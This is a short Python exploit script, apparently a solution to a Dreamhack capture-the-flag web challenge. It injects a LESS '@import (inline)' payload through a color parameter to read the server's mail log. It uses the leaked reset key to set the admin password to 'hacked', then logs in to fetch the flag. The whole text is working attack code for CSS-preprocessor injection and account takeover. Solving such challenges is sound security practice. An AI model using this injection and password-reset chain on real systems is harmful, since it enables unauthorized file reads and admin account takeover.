import requests

url = "http://host8.dreamhack.games:19467/"
url = "http://localhost:3000"
s = requests.Session()

res = s.post(f"{url}/reset_mail")

# get reset key
res = s.post(f"{url}/color", data={
    'bgColor[]': '#000000;@import (inline) "./mail.log"',
    'fontColor': '#000000'
})

if "done" in res.text.lower():
    print("> Injection succeeded")

res = s.get(f'{url}/image.css')

key = res.text.split("\n")[0].strip()

# reset admin password
pwd = 'hacked'

res = s.post(f"{url}/pass_reset", data={
    'password': pwd,
    'key': key
})

if 'done' in res.text.lower():
    print("> Resetted password")

# get flag
res = s.post(f'{url}/login', data={
    'username': 'admin',
    'password': pwd
})

print("Flag:", res.text)